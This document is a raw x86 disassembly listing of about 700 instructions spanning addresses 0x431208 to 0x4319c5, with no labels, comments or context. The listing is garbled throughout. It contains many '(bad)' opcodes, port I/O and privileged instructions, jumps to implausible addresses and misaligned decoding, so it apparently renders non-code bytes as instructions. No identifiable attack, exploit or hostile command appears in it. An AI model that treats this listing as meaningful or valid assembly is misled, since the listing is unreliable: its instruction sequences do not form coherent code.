  431208:	mov    DWORD PTR gs:[eax],eax
  43120b:	call   0x8b6b57d0
  431210:	inc    ebp
  431211:	mov    eax,0xe8d8008b
  431216:	add    BYTE PTR [ecx],ch
  431218:	mov    eax,DWORD PTR [eax]
  43121a:	cld    
  43121b:	mov    eax,eax
  43121d:	call   0x462b2277
  431222:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431228:	cld    
  431229:	mov    BYTE PTR [eax+0x8401c1],0x1
  431230:	xor    BYTE PTR [eax],al
  431232:	push   edi
  431233:	inc    ebp
  431234:	mov    DWORD PTR [ebx],esi
  431236:	in     al,0xb9
  431238:	inc    ebp
  431239:	lea    ecx,[ebx-0x3c370301]
  43123f:	dec    ebp
  431240:	cdq    
  431241:	mov    esi,DWORD PTR [edx]
  431243:	or     BYTE PTR [ebx],al
  431245:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43124c:	call   0x433b96
  431251:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431257:	jge    0x43128c
  431259:	mov    eax,DWORD PTR [ebx]
  43125b:	cld    
  43125c:	lea    edx,[eax+0xff0120]
  431262:	call   0x433bf6
  431267:	push   eax
  431268:	inc    DWORD PTR [ebp-0x1c]
  43126b:	mov    ecx,DWORD PTR [ebp-0x58]
  43126e:	xor    eax,DWORD PTR [eax]
  431270:	add    edi,edi
  431272:	cmp    ebp,eax
  431274:	jne    0x43129c
  431276:	mov    DWORD PTR [eax],0x8b004dd8
  43127c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431283:	mov    eax,ebx
  431285:	cld    
  431286:	test   BYTE PTR [eax+0x320199],bh
  43128c:	mov    DWORD PTR [ebp+0x8],esi
  43128f:	xor    eax,DWORD PTR [ebp-0x73]
  431292:	test   DWORD PTR [esp+esi*2-0x1],edi
  431296:	mov    ebp,eax
  431298:	mov    eax,0x33004d29
  43129d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4312a3:	add    DWORD PTR [eax],eax
  4312a5:	add    BYTE PTR [ebp+0x30],al
  4312a8:	mov    edx,DWORD PTR [edi-0x48]
  4312ab:	add    ebx,0xffffffe4
  4312ae:	addr16 test ebp,ecx
  4312b1:	je     0x4312de
  4312b3:	mov    eax,DWORD PTR [ebx]
  4312b5:	cld    
  4312b6:	sar    BYTE PTR [eax+0x3b0145],1
  4312bc:	pcmpeqw mm4,mm6
  4312bf:	xor    edi,edi
  4312c1:	lea    ecx,[ebx-0x239c7470]
  4312c7:	add    BYTE PTR [ebp+0x50],cl
  4312ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4312cd:	mov    ebp,DWORD PTR [eax-0x68]
  4312d0:	test   DWORD PTR [eax],eax
  4312d2:	clc    
  4312d3:	push   DWORD PTR [ebp-0x1]
  4312d6:	lea    ecx,[eax]
  4312d8:	int3   
  4312d9:	inc    ebp
  4312da:	call   0xfb436a
  4312df:	jne    0x4312d9
  4312e1:	xor    edi,DWORD PTR [ebp-0x41]
  4312e4:	jmp    0x431358
  4312e6:	mov    eax,DWORD PTR [eax]
  4312e8:	mov    eax,0x339545c7
  4312ed:	inc    DWORD PTR [ebx]
  4312ef:	push   DWORD PTR [ecx]
  4312f1:	aaa    
  4312f2:	mov    eax,DWORD PTR [eax]
  4312f4:	jmp    0x431346
  4312f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4312f9:	mov    eax,eax
  4312fb:	cld    
  4312fc:	clc    
  4312fd:	ret    
  4312fe:	test   bh,al
  431300:	pop    es
  431301:	xchg   ebp,eax
  431302:	add    bh,bh
  431304:	inc    ebp
  431305:	dec    DWORD PTR [edi]
  431307:	and    DWORD PTR [ebx],ebp
  431309:	add    BYTE PTR [eax],al
  43130b:	push   eax
  43130c:	jbe    0x431363
  43130e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431314:	or     al,0xcf
  431316:	inc    eax
  431317:	enter  0x745,0x72
  43131b:	inc    ebp
  43131c:	mov    eax,DWORD PTR [ecx]
  43131e:	int3   
  43131f:	add    BYTE PTR [ebp-0x75],al
  431322:	ss mov eax,0x33c74d9c
  431328:	ror    BYTE PTR [ebp+0x72f80885],1
  43132e:	inc    ebp
  43132f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431335:	fadd   st,st(6)
  431337:	rol    BYTE PTR [ebp+0x12],0x8b
  43133b:	inc    ebp
  43133c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431342:	inc    ebp
  431343:	test   bh,al
  431345:	cdq    
  431346:	clc    
  431347:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43134d:	inc    ebp
  43134e:	cmp    BYTE PTR [ebx],dh
  431350:	pushf  
  431351:	mov    ecx,0xffb48dc7
  431356:	test   eax,ecx
  431358:	clc    
  431359:	dec    ebp
  43135a:	inc    ebp
  43135b:	mov    edi,DWORD PTR [edx]
  43135d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431364:	test   edi,edi
  431366:	clc    
  431367:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43136e:	(bad)  
  43136f:	enter  0x18e8,0x85
  431373:	ss clc 
  431375:	pushf  
  431376:	inc    ebp
  431377:	dec    DWORD PTR [ebx-0x3cba0f04]
  43137d:	push   eax
  43137e:	xabort 0x7d
  431381:	add    BYTE PTR [ebx],bh
  431383:	mov    ecx,DWORD PTR [edi]
  431385:	mov    DWORD PTR [eax],ebx
  431387:	les    eax,FWORD PTR [eax]
  431389:	adc    ebp,ecx
  43138b:	dec    ebp
  43138c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431392:	mov    ecx,esi
  431394:	lock or al,cl
  431397:	clc    
  431398:	inc    ebp
  431399:	add    esi,DWORD PTR [ebx]
  43139b:	jge    0x4313a0
  43139d:	xor    edi,DWORD PTR [ebx]
  43139f:	cmp    ecx,DWORD PTR [edi]
  4313a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4313a6:	mov    edi,DWORD PTR [ecx]
  4313a8:	test   al,0xcc
  4313aa:	dec    ebp
  4313ab:	test   BYTE PTR [ebx],dh
  4313ad:	pop    es
  4313ae:	xor    eax,DWORD PTR [eax]
  4313b0:	add    ecx,DWORD PTR [esi]
  4313b2:	add    ecx,eax
  4313b4:	psraw  mm0,mm1
  4313b7:	sub    BYTE PTR [ebp+0x38],cl
  4313ba:	mov    edi,DWORD PTR [ebx]
  4313bc:	lock int3 
  4313be:	shl    edx,1
  4313c0:	rol    BYTE PTR [ebp+0xc],1
  4313c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4313ca:	jmp    0x7c1414
  4313cf:	pushf  
  4313d0:	inc    ebp
  4313d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4313d7:	xor    ecx,ebx
  4313d9:	add    ecx,esi
  4313db:	mov    esi,eax
  4313dd:	enter  0x45af,0x8b
  4313e1:	xor    ecx,eax
  4313e3:	add    edx,DWORD PTR [ebp-0x77]
  4313e6:	sub    ecx,DWORD PTR [eax]
  4313e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4313eb:	(bad)  
  4313ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4313f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4313f9:	cmp    esi,DWORD PTR [ebx]
  4313fb:	pushf  
  4313fc:	xor    eax,edi
  4313fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431405:	inc    ebp
  431406:	dec    ebp
  431407:	cmp    eax,0xc7f09c8b
  43140c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431413:	inc    ebp
  431414:	jmp    0x431455
  431416:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43141d:	dec    ebp
  43141e:	xor    esi,DWORD PTR [ebx]
  431420:	add    eax,DWORD PTR [ebx]
  431422:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431428:	dec    ebp
  431429:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43142f:	out    dx,eax
  431430:	rol    BYTE PTR [eax],1
  431432:	add    eax,0xebc8458b
  431437:	dec    ebp
  431438:	mov    ebp,DWORD PTR [ebx]
  43143a:	mov    esp,0x33f84d8b
  43143f:	ret    
  431440:	xor    eax,esi
  431442:	add    ecx,eax
  431444:	add    eax,DWORD PTR [edx+0xc1010f]
  43144a:	dec    ebp
  43144b:	inc    ebp
  43144c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431452:	ror    bl,1
  431454:	add    eax,0xebc645ce
  431459:	scas   eax,DWORD PTR es:[edi]
  43145a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431460:	xor    ebp,DWORD PTR [ebx]
  431462:	xor    edi,DWORD PTR [ebx]
  431464:	add    esi,DWORD PTR [edi+0x3]
  431467:	mov    ecx,DWORD PTR [edi]
  431469:	clc    
  43146a:	rol    ebx,0x4d
  43146d:	(bad)  
  43146e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431475:	mov    ah,0x45
  431477:	dec    ebp
  431478:	jbe    0x4314ad
  43147a:	mov    esi,DWORD PTR [ebx]
  43147c:	call   0x33466184
  431481:	rdpmc  
  431483:	rol    DWORD PTR [ebx],0x4d
  431486:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43148c:	inc    ebp
  43148d:	ror    BYTE PTR [ebx+0x45450808],1
  431493:	jmp    0x10b1523
  431498:	inc    ebp
  431499:	inc    ebp
  43149a:	(bad)  
  43149b:	mov    ebx,eax
  43149d:	clc    
  43149e:	test   ebx,eax
  4314a0:	clc    
  4314a1:	retf   
  4314a2:	inc    ebp
  4314a3:	into   
  4314a4:	mov    esi,0x8b85afec
  4314aa:	clc    
  4314ab:	enter  0x5545,0x38
  4314af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4314b6:	ret    
  4314b7:	mov    ah,0xc6
  4314b9:	addr16 push 0x338b4545
  4314bf:	clc    
  4314c0:	add    eax,ebx
  4314c2:	loopne 0x43148f
  4314c4:	dec    ebp
  4314c5:	into   
  4314c6:	mov    al,dh
  4314c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4314ce:	inc    ebp
  4314cf:	push   ebp
  4314d0:	mov    ebp,DWORD PTR [ebx]
  4314d2:	in     al,dx
  4314d3:	cmp    eax,ebx
  4314d5:	ja     0x43151c
  4314d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4314dd:	inc    ebp
  4314de:	cdq    
  4314df:	mov    esi,DWORD PTR [edx]
  4314e1:	clc    
  4314e2:	mov    bl,al
  4314e4:	xlat   BYTE PTR ds:[ebx]
  4314e5:	retf   
  4314e6:	inc    ebp
  4314e7:	into   
  4314e8:	mov    eax,esi
  4314ea:	in     al,dx
  4314eb:	scas   eax,DWORD PTR es:[edi]
  4314ec:	retf   
  4314ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4314f0:	mov    edx,DWORD PTR [ebp-0x24]
  4314f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4314fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431501:	mov    eax,DWORD PTR [ebx]
  431503:	clc    
  431504:	loopne 0x4314c9
  431506:	push   ebp
  431507:	retf   
  431508:	mov    dh,al
  43150a:	adc    esi,ecx
  43150c:	jb     0x4314bd
  43150e:	add    BYTE PTR [ebx+0x558bc845],cl
  431514:	in     al,dx
  431515:	sub    eax,ebx
  431517:	cmp    ecx,ebx
  431519:	mov    eax,esi
  43151b:	mov    esp,0x45af03ce
  431520:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431526:	mov    eax,ebx
  431528:	in     al,dx
  431529:	into   
  43152a:	dec    ebp
  43152b:	(bad)  
  43152c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431532:	rol    DWORD PTR [ebp+0x4d],0x89
  431536:	xor    esp,esp
  431538:	sub    eax,DWORD PTR [ebp-0x75]
  43153b:	add    ebp,esp
  43153d:	mov    al,0x55
  43153f:	inc    ebp
  431540:	xor    esi,DWORD PTR [esi]
  431542:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431549:	inc    ebp
  43154a:	xor    edi,DWORD PTR [ecx]
  43154c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431553:	test   DWORD PTR [eax],eax
  431555:	clc    
  431556:	enter  0x8645,0x33
  43155a:	inc    DWORD PTR [ebx]
  43155c:	(bad)  
  43155d:	jmp    0x4315a4
  43155f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431565:	inc    ebp
  431566:	(bad)  
  431567:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43156d:	cdq    
  43156e:	retf   
  43156f:	xor    al,cl
  431571:	mov    BYTE PTR [ebp+0xb],cl
  431574:	lea    eax,[ebp+0x8]
  431577:	xor    esi,DWORD PTR [edx+0x3]
  43157a:	add    al,ah
  43157c:	inc    ebp
  43157d:	dec    ebp
  43157e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431584:	addr16 add ch,cl
  431587:	inc    ebp
  431588:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43158e:	inc    ebp
  43158f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431595:	push   ebp
  431596:	(bad)  
  431597:	mov    BYTE PTR [edi+0xf723b11],ch
  43159d:	add    ch,ch
  43159f:	inc    ebp
  4315a0:	dec    DWORD PTR [ebx-0x34332775]
  4315a6:	add    al,0x4d
  4315a8:	inc    ebp
  4315a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4315af:	cdq    
  4315b0:	add    DWORD PTR [edx],esi
  4315b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4315b8:	push   DWORD PTR [ebx]
  4315ba:	int3   
  4315bb:	xor    eax,DWORD PTR [eax]
  4315bd:	add    edx,DWORD PTR [eax+0x3]
  4315c0:	mov    DWORD PTR [edi],ecx
  4315c2:	call   0x4288d688
  4315c7:	mov    DWORD PTR [ebp-0x20],esp
  4315ca:	add    BYTE PTR [ebp+0x7d],al
  4315cd:	mov    eax,DWORD PTR [eax]
  4315cf:	in     al,0x15
  4315d1:	ret    
  4315d2:	iret   
  4315d3:	(bad)  
  4315d4:	enter  0x14af,0x8b
  4315d8:	(bad)  
  4315d9:	in     al,dx
  4315da:	or     bl,cl
  4315dc:	adc    cl,al
  4315de:	push   ebp
  4315df:	dec    ebp
  4315e0:	inc    eax
  4315e1:	mov    edx,DWORD PTR [ebp-0x20]
  4315e4:	jb     0x4315b1
  4315e6:	mov    ecx,esi
  4315e8:	cld    
  4315e9:	scas   eax,DWORD PTR es:[edi]
  4315ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4315f1:	mov    BYTE PTR [eax],0x8c
  4315f4:	push   0xffffff99
  4315f6:	push   edi
  4315f7:	xor    dl,BYTE PTR [eax+0x3b]
  4315fa:	mov    ecx,DWORD PTR [edi]
  4315fc:	call   0x8c425b5f
  431601:	mov    eax,eax
  431603:	in     al,dx
  431604:	jge    0x431653
  431606:	mov    DWORD PTR [ebx],esi
  431608:	int3   
  431609:	add    eax,DWORD PTR [ebp+0xf]
  43160c:	xor    eax,ecx
  43160e:	(bad)  
  43160f:	dec    ebp
  431610:	pushf  
  431611:	xor    ecx,esi
  431613:	add    edi,DWORD PTR [edi]
  431615:	mov    eax,DWORD PTR [ebp-0x38]
  431618:	(bad)  
  431619:	test   dh,dl
  43161b:	cdq    
  43161c:	add    esi,DWORD PTR [edx]
  43161e:	jmp    0x4315a9
  431620:	mov    cl,al
  431622:	add    eax,0x14330f45
  431627:	mov    ecx,0xff448d80
  43162c:	jmp    0xc99025f9
  431631:	mov    edx,ecx
  431633:	rol    BYTE PTR [ebp+0x330155],1
  431639:	add    ecx,DWORD PTR [ebp+0xf]
  43163c:	xor    eax,edx
  43163e:	(bad)  
  43163f:	ror    DWORD PTR [eax],0x86
  431642:	jb     0x431641
  431644:	add    bh,bh
  431646:	clc    
  431647:	inc    ebp
  431648:	jb     0x4316b4
  43164a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431650:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431658:	ret    
  431659:	xor    al,bh
  43165b:	add    BYTE PTR [ebp+0x75],al
  43165e:	ss push 0xffffff9c
  431661:	inc    edi
  431663:	adc    al,0xe8
  431665:	inc    ebp
  431666:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43166c:	mov    ecx,DWORD PTR [eax]
  43166e:	cld    
  43166f:	or     DWORD PTR [ebp-0x34],0x33
  431673:	jbe    0x431678
  431675:	mov    edx,DWORD PTR [ecx+0x2b]
  431678:	dec    ebp
  431679:	mov    cl,BYTE PTR [ebx+0x45d801]
  43167f:	mov    BYTE PTR [ebx],dh
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	or     BYTE PTR [ecx+0x3b],dl
  431686:	dec    ebp
  431687:	int3   
  431688:	xor    ebp,edi
  43168a:	add    eax,DWORD PTR [ebp+0x51]
  43168d:	mov    ecx,DWORD PTR [ebp-0x28]
  431690:	xor    eax,DWORD PTR [eax]
  431692:	add    ebp,DWORD PTR [eax+0x51]
  431695:	adc    BYTE PTR [eax+0x0],0x8b
  431699:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43169f:	inc    ebp
  4316a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4316a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4316ac:	dec    ebp
  4316ad:	mov    esi,DWORD PTR [ebx]
  4316af:	hlt    
  4316b0:	add    eax,ebx
  4316b2:	push   ecx
  4316b3:	inc    ebp
  4316b4:	dec    ebp
  4316b5:	(bad)  
  4316b6:	call   esi
  4316b8:	in     al,0xc7
  4316ba:	retf   
  4316bb:	mov    al,ds:0xc1ff39ce
  4316c0:	adc    al,0xc6
  4316c2:	inc    ebp
  4316c3:	and    eax,0x9c0f4c85
  4316c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4316cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4316d3:	mov    dh,0xc7
  4316d5:	cmp    eax,eax
  4316d7:	jne    0x45440f23
  4316dd:	mov    edi,DWORD PTR [eax]
  4316df:	mov    eax,0x848bcb9c
  4316e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4316eb:	or     BYTE PTR [edi],cl
  4316ed:	(bad)  
  4316ee:	dec    ebp
  4316ef:	inc    edi
  4316f0:	add    bh,0x51
  4316f3:	or     cl,ch
  4316f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4316fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431701:	mov    esp,0xf802b588
  431706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431707:	inc    ebp
  431708:	(bad)  
  431709:	cmp    bh,bh
  43170b:	pushf  
  43170c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431713:	mov    ecx,DWORD PTR [ebp-0x340018]
  431719:	into   
  43171a:	dec    DWORD PTR [ebx-0x7f72431c]
  431720:	push   0x5000ff01
  431725:	retf   
  431726:	inc    ebp
  431727:	into   
  431728:	dec    DWORD PTR [ebx-0x343f3ff4]
  43172e:	push   eax
  43172f:	into   
  431730:	call   0x4b1bc0
  431735:	retf   
  431736:	add    dh,cl
  431738:	add    bh,bh
  43173a:	mov    DWORD PTR [eax+ecx*1],edx
  43173d:	clc    
  43173e:	inc    ebp
  43173f:	inc    ebp
  431740:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431746:	push   0x1
  431748:	push   edi
  431749:	add    BYTE PTR [eax-0x35],dl
  43174c:	mov    ecx,esi
  43174e:	cld    
  43174f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431755:	into   
  431756:	ror    BYTE PTR [ebx+0x75000800],0x50
  43175d:	xor    eax,DWORD PTR [ebp+0x3]
  431760:	jne    0x4317b3
  431762:	call   DWORD PTR [eax-0x3c]
  431765:	mov    DWORD PTR [ecx-0x18],edx
  431768:	mov    edi,edi
  43176a:	call   0x8b465cf3
  43176f:	add    ah,ah
  431771:	rol    BYTE PTR [ebp-0x7c],0xeb
  431775:	add    edi,edi
  431777:	add    al,ch
  431779:	inc    ebp
  43177a:	push   ecx
  43177b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431781:	mov    al,0xc7
  431783:	test   esp,esp
  431785:	clc    
  431786:	test   DWORD PTR [ebp-0x8],ecx
  431789:	add    BYTE PTR [ebp+0x51],0x39
  43178d:	jmp    0x8bcca02e
  431792:	in     al,dx
  431793:	or     BYTE PTR [ebp-0xf],al
  431796:	xor    eax,DWORD PTR [eax+0x4f896703]
  43179c:	hlt    
  43179d:	mov    eax,DWORD PTR [ebp-0x50]
  4317a0:	xor    esi,ecx
  4317a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4317a8:	inc    ebp
  4317a9:	adc    esi,0x68
  4317ac:	pushf  
  4317ad:	inc    edi
  4317af:	add    al,ch
  4317b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317b2:	test   edi,edi
  4317b4:	clc    
  4317b5:	inc    DWORD PTR [ebp-0x73]
  4317b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4317bc:	(bad)  
  4317bd:	push   ecx
  4317be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317bf:	jne    0x431746
  4317c1:	push   eax
  4317c2:	clc    
  4317c3:	test   DWORD PTR [ebp-0x1],eax
  4317c6:	cmp    eax,0xc78b9cff
  4317cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4317d2:	inc    ebp
  4317d3:	push   edi
  4317d4:	aas    
  4317d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4317dc:	dec    ebp
  4317dd:	add    BYTE PTR [ebx],dh
  4317df:	inc    ebp
  4317e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4317e6:	enter  0x8401,0x0
  4317ea:	add    al,BYTE PTR [eax]
  4317ec:	add    bh,bh
  4317ee:	out    dx,eax
  4317ef:	sbb    BYTE PTR [eax],al
  4317f1:	dec    ebp
  4317f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4317f8:	sub    esi,DWORD PTR [ebx]
  4317fa:	mov    ebp,DWORD PTR [eax-0x8]
  4317fd:	add    bl,0x0
  431800:	(bad)  
  431801:	cmp    eax,ecx
  431803:	or     BYTE PTR [edx+0x750114],al
  431809:	inc    DWORD PTR [ebp+0x18]
  43180c:	mov    eax,DWORD PTR [ebp-0x8]
  43180f:	mov    ebx,eax
  431811:	(bad)  
  431812:	retf   
  431813:	inc    ebp
  431814:	into   
  431815:	mov    esi,eax
  431817:	int3   
  431818:	scas   eax,DWORD PTR es:[edi]
  431819:	push   es
  43181a:	mov    esi,DWORD PTR [ebp-0xc]
  43181d:	call   DWORD PTR [ebp+0x18]
  431820:	sub    edi,DWORD PTR [ebp+0x3b]
  431823:	mov    esi,DWORD PTR [edi-0x34]
  431826:	mov    eax,DWORD PTR [ebp-0x8]
  431829:	ss ret 
  43182b:	pushf  
  43182c:	mov    bh,0xbc
  43182f:	fadd   QWORD PTR [eax]
  431831:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431837:	mov    esi,DWORD PTR [ebx]
  431839:	in     al,0x33
  43183b:	ret    
  43183c:	add    eax,esi
  43183e:	add    eax,DWORD PTR [ebp+0xf]
  431841:	mov    eax,ecx
  431843:	in     al,0x4d
  431845:	ret    
  431846:	mov    eax,esi
  431848:	in     al,dx
  431849:	inc    ebp
  43184a:	rol    edi,1
  43184c:	sar    al,1
  43184e:	or     BYTE PTR [ebp+0x45e9f845],al
  431854:	add    BYTE PTR [eax],bh
  431856:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43185d:	test   ebx,eax
  43185f:	clc    
  431860:	retf   
  431861:	inc    ebp
  431862:	into   
  431863:	cmp    al,dh
  431865:	pushf  
  431866:	scas   eax,DWORD PTR es:[edi]
  431867:	(bad)  
  431868:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43186f:	inc    ebp
  431870:	cmp    edi,DWORD PTR [edi+esi*2]
  431873:	pushf  
  431874:	mov    eax,edi
  431876:	mov    esp,0x458567a8
  43187b:	clc    
  43187c:	mov    eax,DWORD PTR [ebp-0x8]
  43187f:	mov    eax,ebx
  431881:	in     al,dx
  431882:	retf   
  431883:	ret    
  431884:	into   
  431885:	mov    dh,0x7d
  431888:	scas   eax,DWORD PTR es:[edi]
  431889:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43188f:	add    BYTE PTR [ebx],ch
  431891:	jmp    0xba19d1
  431896:	mov    eax,DWORD PTR [ebp-0x5c]
  431899:	mov    eax,DWORD PTR [ebp-0x14]
  43189c:	inc    ebp
  43189d:	enter  0x458b,0xf8
  4318a1:	xor    eax,ebx
  4318a3:	add    ecx,ebx
  4318a5:	cmp    ecx,esi
  4318a7:	shufps xmm7,xmm4,0xaf
  4318ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4318b1:	dec    ebp
  4318b2:	sub    esi,DWORD PTR [ebx]
  4318b4:	cmp    esi,DWORD PTR [ebx]
  4318b6:	ja     0x4318bb
  4318b8:	mov    eax,DWORD PTR [ebx]
  4318ba:	lods   al,BYTE PTR ds:[esi]
  4318bb:	mov    db0,ecx
  4318be:	inc    ebp
  4318bf:	dec    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4318c6:	retf   
  4318c7:	rol    dh,1
  4318c9:	or     al,0xce
  4318cb:	inc    ebp
  4318cc:	scas   eax,DWORD PTR es:[edi]
  4318cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4318d3:	add    BYTE PTR [ebx],ch
  4318d5:	add    BYTE PTR [ebx],bh
  4318d7:	inc    ebp
  4318d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4318de:	inc    ebp
  4318df:	retf   
  4318e0:	mov    ecx,esi
  4318e2:	clc    
  4318e3:	(bad)  
  4318e4:	retf   
  4318e5:	scas   eax,DWORD PTR es:[edi]
  4318e6:	ret    
  4318e7:	mov    ecx,esi
  4318e9:	hlt    
  4318ea:	(bad)  
  4318eb:	push   ebp
  4318ec:	scas   eax,DWORD PTR es:[edi]
  4318ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4318f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4318f9:	add    BYTE PTR [ebx],al
  4318fb:	mov    eax,eax
  4318fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318fe:	inc    ebp
  4318ff:	dec    ebp
  431900:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431908:	inc    ebp
  431909:	(bad)  
  43190b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431913:	sar    eax,1
  431915:	rol    BYTE PTR [ebp+0x5],1
  431918:	xor    eax,DWORD PTR [ebp+0x3]
  43191b:	jmp    0x431908
  43191d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431923:	xor    eax,DWORD PTR [ebp+0x33]
  431926:	mov    eax,DWORD PTR [ebx]
  431928:	rol    BYTE PTR [ebx],1
  43192a:	test   BYTE PTR [edi],cl
  43192c:	cdq    
  43192d:	shl    DWORD PTR [edx],0x4d
  431930:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431936:	xor    edx,eax
  431938:	add    eax,DWORD PTR ds:0xeb4d45e0
  43193e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431944:	add    BYTE PTR [ebx],dh
  431946:	inc    ebp
  431947:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  43194d:	rdpmc  
  43194f:	rol    DWORD PTR [ebx],0x4d
  431952:	loopne 0x4318df
  431954:	push   ebp
  431955:	in     al,dx
  431956:	mov    cl,dl
  431958:	adc    eax,edx
  43195a:	jb     0x431961
  43195c:	add    BYTE PTR [ebp+0x45],al
  43195f:	jmp    0x4318ec
  431961:	mov    ebx,eax
  431963:	test   al,0xcb
  431965:	dec    ebp
  431966:	dec    ebp
  431967:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  43196d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431973:	dec    ebp
  431974:	mov    al,0x8b
  431976:	dec    ebp
  431977:	in     al,dx
  431978:	xor    edx,ecx
  43197a:	xor    edx,eax
  43197c:	add    eax,DWORD PTR [ebp+0x3]
  43197f:	jbe    0x431990
  431981:	mov    eax,ecx
  431983:	test   al,0x45
  431985:	dec    ebp
  431986:	mov    DWORD PTR [ebx],esi
  431988:	loopne 0x4319bd
  43198a:	inc    ebp
  43198b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431991:	rol    esi,0x45
  431994:	scas   eax,DWORD PTR es:[edi]
  431995:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  43199b:	mov    eax,ecx
  43199d:	hlt    
  43199e:	dec    ebp
  43199f:	inc    ebp
  4319a0:	mov    eax,edi
  4319a2:	loopne 0x43197c
  4319a4:	retf   
  4319a5:	test   esi,ecx
  4319a7:	clc    
  4319a8:	scas   eax,DWORD PTR es:[edi]
  4319a9:	inc    ebp
  4319aa:	mov    eax,edi
  4319ac:	fdiv   st,st(0)
  4319ae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4319b4:	cdq    
  4319b5:	cmp    BYTE PTR [edx],dh
  4319b7:	pushf  
  4319b8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4319be:	inc    esi
  4319c0:	mov    ebp,DWORD PTR [eax-0x10]
  4319c3:	inc    ebp
  4319c4:	dec    ebp
  4319c5:	xor    esi,DWORD PTR [ebx]
